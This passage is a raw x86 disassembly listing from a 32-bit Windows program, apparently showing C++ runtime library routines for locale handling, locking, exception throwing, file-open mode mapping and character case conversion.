  42ccc7:	lea    ecx,[ebp-0x50]
  42ccca:	call   0x42ae9f
  42cccf:	mov    DWORD PTR [ebp-0x4],0x1
  42ccd6:	jmp    0x42cc9e
  42ccd8:	push   0x43919c
  42ccdd:	lea    ecx,[ebp-0x94]
  42cce3:	call   0x42ae9f
  42cce8:	lea    eax,[ebp-0x94]
  42ccee:	push   eax
  42ccef:	lea    ecx,[ebp-0x78]
  42ccf2:	mov    DWORD PTR [ebp-0x4],ebx
  42ccf5:	call   0x42cbf4
  42ccfa:	mov    DWORD PTR [ebp-0x78],0x439194
  42cd01:	push   0x43bc78
  42cd06:	lea    eax,[ebp-0x78]
  42cd09:	push   eax
  42cd0a:	call   0x42f187
  42cd0f:	mov    ecx,DWORD PTR [ebp-0xc]
  42cd12:	mov    DWORD PTR fs:0x0,ecx
  42cd19:	leave  
  42cd1a:	ret    0x8
  42cd1d:	mov    eax,0x437f81
  42cd22:	call   0x42f168
  42cd27:	push   ecx
  42cd28:	push   esi
  42cd29:	push   edi
  42cd2a:	mov    edi,DWORD PTR [ebp+0x8]
  42cd2d:	mov    esi,ecx
  42cd2f:	push   edi
  42cd30:	mov    DWORD PTR [ebp-0x10],esi
  42cd33:	call   0x42e66f
  42cd38:	and    DWORD PTR [ebp-0x4],0x0
  42cd3c:	add    edi,0xc
  42cd3f:	push   edi
  42cd40:	lea    ecx,[esi+0xc]
  42cd43:	mov    DWORD PTR [esi],0x439188
  42cd49:	call   0x42ae79
  42cd4e:	mov    ecx,DWORD PTR [ebp-0xc]
  42cd51:	pop    edi
  42cd52:	mov    eax,esi
  42cd54:	pop    esi
  42cd55:	mov    DWORD PTR fs:0x0,ecx
  42cd5c:	leave  
  42cd5d:	ret    0x4
  42cd60:	push   esi
  42cd61:	push   DWORD PTR [esp+0x8]
  42cd65:	mov    esi,ecx
  42cd67:	call   0x42cd1d
  42cd6c:	mov    DWORD PTR [esi],0x439194
  42cd72:	mov    eax,esi
  42cd74:	pop    esi
  42cd75:	ret    0x4
  42cd78:	push   esi
  42cd79:	push   edi
  42cd7a:	push   0x4
  42cd7c:	mov    esi,ecx
  42cd7e:	call   0x42d8d9
  42cd83:	xor    edi,edi
  42cd85:	cmp    eax,edi
  42cd87:	pop    ecx
  42cd88:	je     0x42cd93
  42cd8a:	mov    ecx,eax
  42cd8c:	call   0x42d26c
  42cd91:	jmp    0x42cd95
  42cd93:	xor    eax,eax
  42cd95:	push   edi
  42cd96:	push   edi
  42cd97:	mov    ecx,esi
  42cd99:	mov    DWORD PTR [esi+0x24],eax
  42cd9c:	mov    DWORD PTR [esi+0xc],edi
  42cd9f:	mov    DWORD PTR [esi+0x10],0x201
  42cda6:	mov    DWORD PTR [esi+0x14],0x6
  42cdad:	mov    DWORD PTR [esi+0x18],edi
  42cdb0:	mov    DWORD PTR [esi+0x1c],edi
  42cdb3:	mov    DWORD PTR [esi+0x20],edi
  42cdb6:	call   0x42cc57
  42cdbb:	pop    edi
  42cdbc:	pop    esi
  42cdbd:	ret    
  42cdbe:	mov    eax,DWORD PTR [ecx]
  42cdc0:	mov    eax,DWORD PTR [eax+0x4]
  42cdc3:	add    ecx,0x4
  42cdc6:	mov    DWORD PTR [eax+ecx*1-0x4],0x4391f0
  42cdce:	jmp    0x42af00
  42cdd3:	mov    edx,DWORD PTR ds:0x43fadc
  42cdd9:	test   edx,edx
  42cddb:	push   esi
  42cddc:	mov    esi,0x43f8e0
  42cde1:	mov    eax,ecx
  42cde3:	mov    DWORD PTR ds:0x43fae0,esi
  42cde9:	je     0x42cdf4
  42cdeb:	mov    ecx,DWORD PTR [edx]
  42cded:	mov    ecx,DWORD PTR [ecx+0x4]
  42cdf0:	mov    DWORD PTR [ecx+edx*1+0x2c],esi
  42cdf4:	mov    edx,DWORD PTR ds:0x43fae4
  42cdfa:	test   edx,edx
  42cdfc:	je     0x42ce0d
  42cdfe:	mov    ecx,DWORD PTR [edx]
  42ce00:	mov    ecx,DWORD PTR [ecx+0x4]
  42ce03:	mov    esi,DWORD PTR ds:0x43fae0
  42ce09:	mov    DWORD PTR [ecx+edx*1+0x2c],esi
  42ce0d:	mov    edx,DWORD PTR ds:0x43fae8
  42ce13:	test   edx,edx
  42ce15:	je     0x42ce26
  42ce17:	mov    ecx,DWORD PTR [edx]
  42ce19:	mov    ecx,DWORD PTR [ecx+0x4]
  42ce1c:	mov    esi,DWORD PTR ds:0x43fae0
  42ce22:	mov    DWORD PTR [ecx+edx*1+0x2c],esi
  42ce26:	pop    esi
  42ce27:	ret    
  42ce28:	push   esi
  42ce29:	lea    esi,[ecx-0x4]
  42ce2c:	mov    ecx,esi
  42ce2e:	call   0x42cdbe
  42ce33:	test   BYTE PTR [esp+0x8],0x1
  42ce38:	je     0x42ce41
  42ce3a:	push   esi
  42ce3b:	call   0x42e750
  42ce40:	pop    ecx
  42ce41:	mov    eax,esi
  42ce43:	pop    esi
  42ce44:	ret    0x4
  42ce47:	mov    eax,0x437fa7
  42ce4c:	call   0x42f168
  42ce51:	push   ecx
  42ce52:	push   ecx
  42ce53:	xor    eax,eax
  42ce55:	cmp    DWORD PTR [ebp+0x10],eax
  42ce58:	push   esi
  42ce59:	mov    esi,ecx
  42ce5b:	mov    DWORD PTR [ebp-0x14],esi
  42ce5e:	mov    DWORD PTR [ebp-0x10],eax
  42ce61:	je     0x42ce7a
  42ce63:	mov    DWORD PTR [esi],0x439294
  42ce69:	mov    DWORD PTR [esi+0x4],0x4391f8
  42ce70:	mov    DWORD PTR [ebp-0x4],eax
  42ce73:	mov    DWORD PTR [ebp-0x10],0x1
  42ce7a:	mov    eax,DWORD PTR [esi]
  42ce7c:	mov    eax,DWORD PTR [eax+0x4]
  42ce7f:	push   DWORD PTR [ebp+0xc]
  42ce82:	mov    DWORD PTR [esi+eax*1],0x4391f0
  42ce89:	mov    eax,DWORD PTR [esi]
  42ce8b:	mov    ecx,DWORD PTR [eax+0x4]
  42ce8e:	push   DWORD PTR [ebp+0x8]
  42ce91:	add    ecx,esi
  42ce93:	call   0x42c2c1
  42ce98:	mov    ecx,DWORD PTR [ebp-0xc]
  42ce9b:	mov    eax,esi
  42ce9d:	pop    esi
  42ce9e:	mov    DWORD PTR fs:0x0,ecx
  42cea5:	leave  
  42cea6:	ret    0xc
  42cea9:	mov    edx,DWORD PTR ds:0x43fae0
  42ceaf:	mov    eax,ecx
  42ceb1:	mov    ecx,DWORD PTR ds:0x43f978
  42ceb7:	mov    DWORD PTR ds:0x43fadc,0x43f978
  42cec1:	mov    ecx,DWORD PTR [ecx+0x4]
  42cec4:	mov    DWORD PTR [ecx+0x43f9a4],edx
  42ceca:	ret    
  42cecb:	mov    ecx,DWORD PTR [ecx+0x4]
  42cece:	call   0x401158
  42ced3:	test   eax,eax
  42ced5:	je     0x42cedf
  42ced7:	mov    edx,DWORD PTR [eax]
  42ced9:	push   0x1
  42cedb:	mov    ecx,eax
  42cedd:	call   DWORD PTR [edx]
  42cedf:	ret    
  42cee0:	mov    eax,DWORD PTR [esp+0x4]
  42cee4:	mov    ecx,DWORD PTR [eax]
  42cee6:	test   ecx,ecx
  42cee8:	je     0x42cefb
  42ceea:	call   0x401158
  42ceef:	test   eax,eax
  42cef1:	je     0x42cefb
  42cef3:	mov    edx,DWORD PTR [eax]
  42cef5:	push   0x1
  42cef7:	mov    ecx,eax
  42cef9:	call   DWORD PTR [edx]
  42cefb:	ret    
  42cefc:	push   ebp
  42cefd:	mov    ebp,esp
  42ceff:	push   ecx
  42cf00:	push   0x0
  42cf02:	lea    ecx,[ebp-0x4]
  42cf05:	call   0x42d311
  42cf0a:	push   0x43f9b8
  42cf0f:	call   0x42cee0
  42cf14:	pop    ecx
  42cf15:	lea    ecx,[ebp-0x4]
  42cf18:	call   0x42d334
  42cf1d:	leave  
  42cf1e:	ret    
  42cf1f:	cmp    BYTE PTR ds:0x43f9dc,0x0
  42cf26:	jne    0x42cf3a
  42cf28:	push   0x42cefc
  42cf2d:	mov    BYTE PTR ds:0x43f9dc,0x1
  42cf34:	call   0x42d8fd
  42cf39:	pop    ecx
  42cf3a:	mov    eax,DWORD PTR [esp+0x4]
  42cf3e:	mov    ds:0x43f9b8,eax
  42cf43:	ret    
  42cf44:	mov    ecx,DWORD PTR [ecx]
  42cf46:	mov    edx,DWORD PTR [esp+0x4]
  42cf4a:	cmp    edx,DWORD PTR [ecx+0xc]
  42cf4d:	jae    0x42cf57
  42cf4f:	mov    eax,DWORD PTR [ecx+0x8]
  42cf52:	mov    eax,DWORD PTR [eax+edx*4]
  42cf55:	jmp    0x42cf59
  42cf57:	xor    eax,eax
  42cf59:	test   eax,eax
  42cf5b:	jne    0x42cf76
  42cf5d:	cmp    BYTE PTR [ecx+0x14],al
  42cf60:	je     0x42cf76
  42cf62:	mov    eax,ds:0x43f9b8
  42cf67:	cmp    edx,DWORD PTR [eax+0xc]
  42cf6a:	jae    0x42cf74
  42cf6c:	mov    eax,DWORD PTR [eax+0x8]
  42cf6f:	mov    eax,DWORD PTR [eax+edx*4]
  42cf72:	jmp    0x42cf76
  42cf74:	xor    eax,eax
  42cf76:	ret    0x4
  42cf79:	push   ebp
  42cf7a:	mov    ebp,esp
  42cf7c:	push   ecx
  42cf7d:	push   0x0
  42cf7f:	lea    ecx,[ebp-0x4]
  42cf82:	call   0x42d311
  42cf87:	mov    eax,ds:0x43f9b4
  42cf8c:	test   eax,eax
  42cf8e:	je     0x42cfb2
  42cf90:	push   esi
  42cf91:	mov    esi,eax
  42cf93:	mov    eax,DWORD PTR [eax]
  42cf95:	mov    ecx,esi
  42cf97:	mov    ds:0x43f9b4,eax
  42cf9c:	call   0x42cecb
  42cfa1:	push   esi
  42cfa2:	call   0x42e750
  42cfa7:	mov    eax,ds:0x43f9b4
  42cfac:	test   eax,eax
  42cfae:	pop    ecx
  42cfaf:	jne    0x42cf91
  42cfb1:	pop    esi
  42cfb2:	lea    ecx,[ebp-0x4]
  42cfb5:	call   0x42d334
  42cfba:	leave  
  42cfbb:	ret    
  42cfbc:	cmp    DWORD PTR ds:0x43f9b4,0x0
  42cfc3:	push   esi
  42cfc4:	mov    esi,ecx
  42cfc6:	jne    0x42cfd3
  42cfc8:	push   0x42cf79
  42cfcd:	call   0x42d8fd
  42cfd2:	pop    ecx
  42cfd3:	push   0x8
  42cfd5:	call   0x42d8d9
  42cfda:	test   eax,eax
  42cfdc:	pop    ecx
  42cfdd:	je     0x42cfec
  42cfdf:	mov    ecx,DWORD PTR ds:0x43f9b4
  42cfe5:	mov    DWORD PTR [eax],ecx
  42cfe7:	mov    DWORD PTR [eax+0x4],esi
  42cfea:	jmp    0x42cfee
  42cfec:	xor    eax,eax
  42cfee:	mov    ds:0x43f9b4,eax
  42cff3:	pop    esi
  42cff4:	ret    
  42cff5:	mov    eax,0x437fcc
  42cffa:	call   0x42f168
  42cfff:	push   ecx
  42d000:	push   ecx
  42d001:	push   esi
  42d002:	mov    esi,ecx
  42d004:	push   edi
  42d005:	mov    DWORD PTR [ebp-0x14],esi
  42d008:	mov    DWORD PTR [esi],0x4392d0
  42d00e:	push   0x0
  42d010:	lea    ecx,[ebp-0x10]
  42d013:	mov    DWORD PTR [ebp-0x4],0x1
  42d01a:	call   0x42d311
  42d01f:	mov    edi,DWORD PTR [esi+0xc]
  42d022:	mov    BYTE PTR [ebp-0x4],0x2
  42d026:	jmp    0x42d044
  42d028:	mov    eax,DWORD PTR [esi+0x8]
  42d02b:	dec    edi
  42d02c:	mov    ecx,DWORD PTR [eax+edi*4]
  42d02f:	test   ecx,ecx
  42d031:	je     0x42d044
  42d033:	call   0x401158
  42d038:	test   eax,eax
  42d03a:	je     0x42d044
  42d03c:	mov    edx,DWORD PTR [eax]
  42d03e:	push   0x1
  42d040:	mov    ecx,eax
  42d042:	call   DWORD PTR [edx]
  42d044:	test   edi,edi
  42d046:	ja     0x42d028
  42d048:	push   DWORD PTR [esi+0x8]
  42d04b:	call   0x42e0ed
  42d050:	pop    ecx
  42d051:	lea    ecx,[ebp-0x10]
  42d054:	mov    BYTE PTR [ebp-0x4],0x1
  42d058:	call   0x42d334
  42d05d:	push   0x0
  42d05f:	push   0x1
  42d061:	lea    ecx,[esi+0x18]
  42d064:	call   0x42bb7b
  42d069:	mov    ecx,DWORD PTR [ebp-0xc]
  42d06c:	mov    DWORD PTR [esi],0x4391e8
  42d072:	pop    edi
  42d073:	pop    esi
  42d074:	mov    DWORD PTR fs:0x0,ecx
  42d07b:	leave  
  42d07c:	ret    
  42d07d:	push   ebx
  42d07e:	push   esi
  42d07f:	mov    esi,ecx
  42d081:	xor    ebx,ebx
  42d083:	cmp    DWORD PTR [esi+0x50],ebx
  42d086:	jbe    0x42d09f
  42d088:	cmp    DWORD PTR [esi+0x54],0x10
  42d08c:	jb     0x42d093
  42d08e:	mov    eax,DWORD PTR [esi+0x40]
  42d091:	jmp    0x42d096
  42d093:	lea    eax,[esi+0x40]
  42d096:	push   eax
  42d097:	push   ebx
  42d098:	call   0x42fec1
  42d09d:	pop    ecx
  42d09e:	pop    ecx
  42d09f:	push   ebx
  42d0a0:	push   0x1
  42d0a2:	lea    ecx,[esi+0x58]
  42d0a5:	call   0x42bb7b
  42d0aa:	push   ebx
  42d0ab:	push   0x1
  42d0ad:	lea    ecx,[esi+0x3c]
  42d0b0:	call   0x42bb7b
  42d0b5:	push   ebx
  42d0b6:	push   0x1
  42d0b8:	lea    ecx,[esi+0x20]
  42d0bb:	call   0x42bb7b
  42d0c0:	push   ebx
  42d0c1:	push   0x1
  42d0c3:	lea    ecx,[esi+0x4]
  42d0c6:	call   0x42bb7b
  42d0cb:	mov    ecx,esi
  42d0cd:	pop    esi
  42d0ce:	pop    ebx
  42d0cf:	jmp    0x42d334
  42d0d4:	push   esi
  42d0d5:	mov    esi,ecx
  42d0d7:	call   0x42cff5
  42d0dc:	test   BYTE PTR [esp+0x8],0x1
  42d0e1:	je     0x42d0ea
  42d0e3:	push   esi
  42d0e4:	call   0x42e750
  42d0e9:	pop    ecx
  42d0ea:	mov    eax,esi
  42d0ec:	pop    esi
  42d0ed:	ret    0x4
  42d0f0:	mov    eax,0x437fde
  42d0f5:	call   0x42f168
  42d0fa:	push   ecx
  42d0fb:	push   esi
  42d0fc:	mov    esi,ecx
  42d0fe:	mov    DWORD PTR [ebp-0x10],esi
  42d101:	mov    DWORD PTR [esi+0x4],0x1
  42d108:	xor    eax,eax
  42d10a:	mov    DWORD PTR [ebp-0x4],eax
  42d10d:	mov    DWORD PTR [esi+0x8],eax
  42d110:	mov    DWORD PTR [esi+0xc],eax
  42d113:	mov    DWORD PTR [esi+0x10],eax
  42d116:	mov    al,BYTE PTR [ebp+0x8]
  42d119:	push   0x4392d4
  42d11e:	lea    ecx,[esi+0x18]
  42d121:	mov    DWORD PTR [esi],0x4392d0
  42d127:	mov    BYTE PTR [esi+0x14],al
  42d12a:	call   0x42ae9f
  42d12f:	mov    ecx,DWORD PTR [ebp-0xc]
  42d132:	mov    eax,esi
  42d134:	pop    esi
  42d135:	mov    DWORD PTR fs:0x0,ecx
  42d13c:	leave  
  42d13d:	ret    0x4
  42d140:	mov    eax,0x43801c
  42d145:	call   0x42f168
  42d14a:	push   ecx
  42d14b:	push   ebx
  42d14c:	push   esi
  42d14d:	push   edi
  42d14e:	mov    esi,ecx
  42d150:	xor    ebx,ebx
  42d152:	push   ebx
  42d153:	mov    DWORD PTR [ebp-0x10],esi
  42d156:	call   0x42d311
  42d15b:	lea    ecx,[esi+0x4]
  42d15e:	mov    DWORD PTR [ebp-0x4],ebx
  42d161:	call   0x42c162
  42d166:	lea    ecx,[esi+0x20]
  42d169:	call   0x42c162
  42d16e:	lea    edi,[esi+0x3c]
  42d171:	mov    ecx,edi
  42d173:	call   0x42c162
  42d178:	lea    ecx,[esi+0x58]
  42d17b:	call   0x42c162
  42d180:	push   ebx
  42d181:	push   ebx
  42d182:	mov    BYTE PTR [ebp-0x4],0x4
  42d186:	call   0x42fec1
  42d18b:	pop    ecx
  42d18c:	pop    ecx
  42d18d:	push   eax
  42d18e:	mov    ecx,edi
  42d190:	call   0x42baf2
  42d195:	cmp    DWORD PTR [ebp+0x8],ebx
  42d198:	je     0x42d1a9
  42d19a:	push   DWORD PTR [ebp+0x8]
  42d19d:	push   ebx
  42d19e:	call   0x42fec1
  42d1a3:	cmp    eax,ebx
  42d1a5:	pop    ecx
  42d1a6:	pop    ecx
  42d1a7:	jne    0x42d1ae
  42d1a9:	mov    eax,0x4392d4
  42d1ae:	push   eax
  42d1af:	lea    ecx,[esi+0x58]
  42d1b2:	call   0x42baf2
  42d1b7:	mov    ecx,DWORD PTR [ebp-0xc]
  42d1ba:	pop    edi
  42d1bb:	mov    eax,esi
  42d1bd:	pop    esi
  42d1be:	pop    ebx
  42d1bf:	mov    DWORD PTR fs:0x0,ecx
  42d1c6:	leave  
  42d1c7:	ret    0x4
  42d1ca:	mov    eax,0x438038
  42d1cf:	call   0x42f168
  42d1d4:	push   ecx
  42d1d5:	push   ecx
  42d1d6:	mov    eax,ds:0x43f9b8
  42d1db:	test   eax,eax
  42d1dd:	push   esi
  42d1de:	mov    esi,eax
  42d1e0:	jne    0x42d25d
  42d1e2:	push   eax
  42d1e3:	lea    ecx,[ebp-0x10]
  42d1e6:	call   0x42d311
  42d1eb:	mov    eax,ds:0x43f9b8
  42d1f0:	and    DWORD PTR [ebp-0x4],esi
  42d1f3:	test   eax,eax
  42d1f5:	mov    esi,eax
  42d1f7:	jne    0x42d251
  42d1f9:	push   0x34
  42d1fb:	call   0x42d8d9
  42d200:	pop    ecx
  42d201:	mov    ecx,eax
  42d203:	mov    DWORD PTR [ebp-0x14],ecx
  42d206:	test   ecx,ecx
  42d208:	mov    BYTE PTR [ebp-0x4],0x1
  42d20c:	je     0x42d218
  42d20e:	push   esi
  42d20f:	call   0x42d0f0
  42d214:	mov    esi,eax
  42d216:	jmp    0x42d21a
  42d218:	xor    esi,esi
  42d21a:	push   esi
  42d21b:	mov    BYTE PTR [ebp-0x4],0x0
  42d21f:	call   0x42cf1f
  42d224:	lea    ecx,[esi+0x18]
  42d227:	mov    DWORD PTR [esi+0x10],0x3f
  42d22e:	mov    DWORD PTR [esp],0x43b560
  42d235:	call   0x42baf2
  42d23a:	mov    ecx,esi
  42d23c:	mov    DWORD PTR ds:0x43f9bc,esi
  42d242:	call   0x401130
  42d247:	mov    eax,ds:0x43f9bc
  42d24c:	mov    ds:0x43f9c4,eax
  42d251:	or     DWORD PTR [ebp-0x4],0xffffffff
  42d255:	lea    ecx,[ebp-0x10]
  42d258:	call   0x42d334
  42d25d:	mov    ecx,DWORD PTR [ebp-0xc]
  42d260:	mov    eax,esi
  42d262:	pop    esi
  42d263:	mov    DWORD PTR fs:0x0,ecx
  42d26a:	leave  
  42d26b:	ret    
  42d26c:	push   esi
  42d26d:	mov    esi,ecx
  42d26f:	call   0x42d1ca
  42d274:	mov    DWORD PTR [esi],eax
  42d276:	mov    ecx,DWORD PTR ds:0x43f9b8
  42d27c:	call   0x401130
  42d281:	mov    eax,esi
  42d283:	pop    esi
  42d284:	ret    
  42d285:	mov    edx,DWORD PTR ds:0x43fae0
  42d28b:	push   esi
  42d28c:	mov    eax,ecx
  42d28e:	mov    ecx,DWORD PTR ds:0x43fa40
  42d294:	mov    esi,0x43fa40
  42d299:	mov    DWORD PTR ds:0x43fae4,esi
  42d29f:	mov    ecx,DWORD PTR [ecx+0x4]
  42d2a2:	mov    DWORD PTR [ecx+0x43fa6c],edx
  42d2a8:	mov    ecx,DWORD PTR ds:0x43fa40
  42d2ae:	mov    edx,DWORD PTR [ecx+0x4]
  42d2b1:	add    edx,esi
  42d2b3:	or     DWORD PTR [edx+0x10],0x2
  42d2b7:	pop    esi
  42d2b8:	ret    
  42d2b9:	push   edi
  42d2ba:	push   0x43d2e8
  42d2bf:	mov    edi,ecx
  42d2c1:	call   DWORD PTR ds:0x439074
  42d2c7:	test   eax,eax
  42d2c9:	jne    0x42d2e4
  42d2cb:	push   esi
  42d2cc:	mov    esi,0x43fa78
  42d2d1:	push   esi
  42d2d2:	call   0x42d93d
  42d2d7:	add    esi,0x18
  42d2da:	cmp    esi,0x43fad8
  42d2e0:	pop    ecx
  42d2e1:	jl     0x42d2d1
  42d2e3:	pop    esi
  42d2e4:	mov    eax,edi
  42d2e6:	pop    edi
  42d2e7:	ret    
  42d2e8:	push   0x43d2e8
  42d2ed:	call   DWORD PTR ds:0x439078
  42d2f3:	test   eax,eax
  42d2f5:	jge    0x42d310
  42d2f7:	push   esi
  42d2f8:	mov    esi,0x43fa78
  42d2fd:	push   esi
  42d2fe:	call   0x42d948
  42d303:	add    esi,0x18
  42d306:	cmp    esi,0x43fad8
  42d30c:	pop    ecx
  42d30d:	jl     0x42d2fd
  42d30f:	pop    esi
  42d310:	ret    
  42d311:	mov    eax,DWORD PTR [esp+0x4]
  42d315:	and    eax,0x3
  42d318:	push   esi
  42d319:	mov    esi,ecx
  42d31b:	mov    DWORD PTR [esi],eax
  42d31d:	lea    eax,[eax+eax*2]
  42d320:	lea    eax,[eax*8+0x43fa78]
  42d327:	push   eax
  42d328:	call   0x42d953
  42d32d:	pop    ecx
  42d32e:	mov    eax,esi
  42d330:	pop    esi
  42d331:	ret    0x4
  42d334:	mov    eax,DWORD PTR [ecx]
  42d336:	lea    eax,[eax+eax*2]
  42d339:	lea    eax,[eax*8+0x43fa78]
  42d340:	push   eax
  42d341:	call   0x42d95e
  42d346:	pop    ecx
  42d347:	ret    
  42d348:	push   esi
  42d349:	mov    esi,ecx
  42d34b:	call   0x42d364
  42d350:	test   BYTE PTR [esp+0x8],0x1
  42d355:	je     0x42d35e
  42d357:	push   esi
  42d358:	call   0x42e750
  42d35d:	pop    ecx
  42d35e:	mov    eax,esi
  42d360:	pop    esi
  42d361:	ret    0x4
  42d364:	mov    DWORD PTR [ecx],0x4392e8
  42d36a:	jmp    0x401037
  42d36f:	mov    eax,0x43804a
  42d374:	call   0x42f168
  42d379:	sub    esp,0x44
  42d37c:	push   0x4392fc
  42d381:	lea    ecx,[ebp-0x28]
  42d384:	call   0x42ae9f
  42d389:	and    DWORD PTR [ebp-0x4],0x0
  42d38d:	lea    eax,[ebp-0x28]
  42d390:	push   eax
  42d391:	lea    ecx,[ebp-0x50]
  42d394:	call   0x401017
  42d399:	push   0x43be88
  42d39e:	lea    eax,[ebp-0x50]
  42d3a1:	push   eax
  42d3a2:	mov    DWORD PTR [ebp-0x50],0x4392f4
  42d3a9:	call   0x42f187
  42d3ae:	int3   
  42d3af:	mov    eax,0x43804a
  42d3b4:	call   0x42f168
  42d3b9:	sub    esp,0x44
  42d3bc:	push   0x439314
  42d3c1:	lea    ecx,[ebp-0x28]
  42d3c4:	call   0x42ae9f
  42d3c9:	and    DWORD PTR [ebp-0x4],0x0
  42d3cd:	lea    eax,[ebp-0x28]
  42d3d0:	push   eax
  42d3d1:	lea    ecx,[ebp-0x50]
  42d3d4:	call   0x401017
  42d3d9:	push   0x43be1c
  42d3de:	lea    eax,[ebp-0x50]
  42d3e1:	push   eax
  42d3e2:	mov    DWORD PTR [ebp-0x50],0x4392e8
  42d3e9:	call   0x42f187
  42d3ee:	int3   
  42d3ef:	push   esi
  42d3f0:	push   DWORD PTR [esp+0x8]
  42d3f4:	mov    esi,ecx
  42d3f6:	call   0x42ca7a
  42d3fb:	mov    DWORD PTR [esi],0x4392e8
  42d401:	mov    eax,esi
  42d403:	pop    esi
  42d404:	ret    0x4
  42d407:	push   esi
  42d408:	push   0x18
  42d40a:	mov    esi,ecx
  42d40c:	call   0x42d8d9
  42d411:	push   eax
  42d412:	mov    DWORD PTR [esi],eax
  42d414:	call   0x42d93d
  42d419:	pop    ecx
  42d41a:	pop    ecx
  42d41b:	mov    eax,esi
  42d41d:	pop    esi
  42d41e:	ret    
  42d41f:	push   esi
  42d420:	mov    esi,ecx
  42d422:	push   DWORD PTR [esi]
  42d424:	call   0x42d948
  42d429:	push   DWORD PTR [esi]
  42d42b:	call   0x42e750
  42d430:	pop    ecx
  42d431:	pop    ecx
  42d432:	pop    esi
  42d433:	ret    
  42d434:	push   DWORD PTR [ecx]
  42d436:	call   0x42d953
  42d43b:	pop    ecx
  42d43c:	ret    
  42d43d:	push   DWORD PTR [ecx]
  42d43f:	call   0x42d95e
  42d444:	pop    ecx
  42d445:	ret    
  42d446:	jmp    0x4301ba
  42d44b:	mov    edx,DWORD PTR [esp+0x8]
  42d44f:	push   ebx
  42d450:	push   esi
  42d451:	push   edi
  42d452:	mov    ebx,edx
  42d454:	mov    edi,edx
  42d456:	and    ebx,0x4
  42d459:	and    edi,0x80
  42d45f:	test   dl,0x40
  42d462:	je     0x42d467
  42d464:	or     edx,0x1
  42d467:	xor    ecx,ecx
  42d469:	and    edx,0xffffff3b
  42d46f:	xor    eax,eax
  42d471:	inc    ecx
  42d472:	cmp    ecx,edx
  42d474:	je     0x42d482
  42d476:	mov    ecx,DWORD PTR [eax*4+0x439358]
  42d47d:	inc    eax
  42d47e:	test   ecx,ecx
  42d480:	jne    0x42d472
  42d482:	mov    esi,eax
  42d484:	shl    esi,0x2
  42d487:	cmp    DWORD PTR [esi+0x439354],0x0
  42d48e:	je     0x42d4e3
  42d490:	test   edi,edi
  42d492:	je     0x42d4b0
  42d494:	test   dl,0x1
  42d497:	je     0x42d4b0
  42d499:	push   0x439350
  42d49e:	push   DWORD PTR [esp+0x14]
  42d4a2:	call   0x430934
  42d4a7:	test   eax,eax
  42d4a9:	pop    ecx
  42d4aa:	pop    ecx
  42d4ab:	je     0x42d4b0
  42d4ad:	push   eax
  42d4ae:	jmp    0x42d4dd
  42d4b0:	push   DWORD PTR [esi+0x43d30c]
  42d4b6:	push   DWORD PTR [esp+0x14]
  42d4ba:	call   0x430934
  42d4bf:	mov    esi,eax
  42d4c1:	test   esi,esi
  42d4c3:	pop    ecx
  42d4c4:	pop    ecx
  42d4c5:	je     0x42d4e3
  42d4c7:	test   ebx,ebx
  42d4c9:	je     0x42d4e7
  42d4cb:	push   0x2
  42d4cd:	push   0x0
  42d4cf:	push   esi
  42d4d0:	call   0x42e937
  42d4d5:	add    esp,0xc
  42d4d8:	test   eax,eax
  42d4da:	je     0x42d4e7
  42d4dc:	push   esi
  42d4dd:	call   0x42ea2e
  42d4e2:	pop    ecx
  42d4e3:	xor    eax,eax
  42d4e5:	jmp    0x42d4e9
  42d4e7:	mov    eax,esi
  42d4e9:	pop    edi
  42d4ea:	pop    esi
  42d4eb:	pop    ebx
  42d4ec:	ret    
  42d4ed:	push   ebp
  42d4ee:	mov    ebp,esp
  42d4f0:	sub    esp,0x10
  42d4f3:	push   esi
  42d4f4:	mov    esi,DWORD PTR [ebp+0xc]
  42d4f7:	test   esi,esi
  42d4f9:	jne    0x42d50d
  42d4fb:	call   0x430fba
  42d500:	mov    eax,DWORD PTR [eax+0x8]
  42d503:	mov    DWORD PTR [ebp-0xc],eax
  42d506:	call   0x430fa1
  42d50b:	jmp    0x42d515
  42d50d:	mov    eax,DWORD PTR [esi]
  42d50f:	mov    DWORD PTR [ebp-0xc],eax
  42d512:	mov    eax,DWORD PTR [esi+0x4]
  42d515:	cmp    DWORD PTR [ebp-0xc],0x0
  42d519:	mov    DWORD PTR [ebp-0x10],eax
  42d51c:	jne    0x42d53b
  42d51e:	mov    eax,DWORD PTR [ebp+0x8]
  42d521:	cmp    eax,0x41
  42d524:	jl     0x42d5d3
  42d52a:	cmp    eax,0x5a
  42d52d:	jg     0x42d5d3
  42d533:	add    eax,0x20
  42d536:	jmp    0x42d5d3
  42d53b:	push   ebx
  42d53c:	mov    ebx,DWORD PTR [ebp+0x8]
  42d53f:	push   edi
  42d540:	mov    edi,0x100
  42d545:	cmp    ebx,edi
  42d547:	jae    0x42d563
  42d549:	test   esi,esi
  42d54b:	jne    0x42d55a
  42d54d:	push   ebx
  42d54e:	call   0x430d09
  42d553:	test   eax,eax
  42d555:	pop    ecx
  42d556:	jne    0x42d563
  42d558:	jmp    0x42d5b7
  42d55a:	mov    eax,DWORD PTR [esi+0x8]
  42d55d:	test   BYTE PTR [eax+ebx*2],0x1
  42d561:	je     0x42d5b7
  42d563:	mov    DWORD PTR [ebp-0x8],ebx
  42d566:	sar    DWORD PTR [ebp-0x8],0x8
  42d56a:	call   0x430d03
  42d56f:	mov    ecx,eax
  42d571:	mov    al,BYTE PTR [ebp-0x8]
  42d574:	movzx  edx,al
  42d577:	test   BYTE PTR [ecx+edx*2+0x1],0x80
  42d57c:	je     0x42d58d
  42d57e:	push   0x2
  42d580:	mov    BYTE PTR [ebp+0xc],al
  42d583:	mov    BYTE PTR [ebp+0xd],bl
  42d586:	mov    BYTE PTR [ebp+0xe],0x0
  42d58a:	pop    eax
  42d58b:	jmp    0x42d597
  42d58d:	xor    eax,eax
  42d58f:	mov    BYTE PTR [ebp+0xc],bl
  42d592:	mov    BYTE PTR [ebp+0xd],0x0
  42d596:	inc    eax
  42d597:	push   0x1
  42d599:	push   DWORD PTR [ebp-0x10]
  42d59c:	lea    ecx,[ebp-0x4]
  42d59f:	push   0x3
  42d5a1:	push   ecx
  42d5a2:	push   eax
  42d5a3:	lea    eax,[ebp+0xc]
  42d5a6:	push   eax
  42d5a7:	push   edi
  42d5a8:	push   DWORD PTR [ebp-0xc]
  42d5ab:	call   0x430947
  42d5b0:	add    esp,0x20
  42d5b3:	test   eax,eax
  42d5b5:	jne    0x42d5bb
  42d5b7:	mov    eax,ebx
  42d5b9:	jmp    0x42d5d1
  42d5bb:	cmp    eax,0x1
  42d5be:	jne    0x42d5c6
  42d5c0:	movzx  eax,BYTE PTR [ebp-0x4]
  42d5c4:	jmp    0x42d5d1
